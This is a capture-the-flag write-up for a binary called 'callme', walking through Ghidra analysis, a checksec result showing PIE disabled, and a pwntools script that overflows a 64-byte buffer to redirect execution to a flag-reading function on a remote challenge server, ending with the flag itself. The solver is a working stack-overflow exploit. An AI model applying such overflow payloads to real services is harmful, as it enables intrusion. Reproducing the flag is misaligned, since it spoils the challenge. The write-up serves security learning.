# callme

> Let's see if you can get the flag.

Download the attachment [here](file/callme)

## How to Solve

First we use `Ghidra` to do static analysis, and look the main function

![POC 1](images/POC%201.jpg)

Likely there are nothing to do, but we see some interesting function

![POC 2](images/POC%202.jpg)

That's mean we need to jump to `callme` function and read the flag, so at the main function we just need filled the `local_54` variable which is has 64 bytes

And we do the checksec

![POC 3](images/POC%203.jpg)

Because PIE is not enable it's mean the function address is not gonna change every process

And find the function address at `Ghidra`

![POC 4](images/POC%204.jpg)

We got the address is `0x0804875e`

This the solver I use

```
from pwn import *

exe = './callme'
host, port = '139.144.184.150', 3333
elf = context.binary = ELF(exe, checksec=True)
rop = ROP(exe)
context.log_level = 'info'

# io = process(exe)
io = remote(host, port)

offset = b'A'*64

payload = flat([
    offset,
    0x0804875e,
    rop.ret.address,
    elf.sym['callme']
])

io.sendline(payload)
io.interactive()
```

![POC 5](images/POC%205.jpg)

And we got flag

```
BDSEC{reverse_engineering_shatters_the_chains_of_ignorance}
```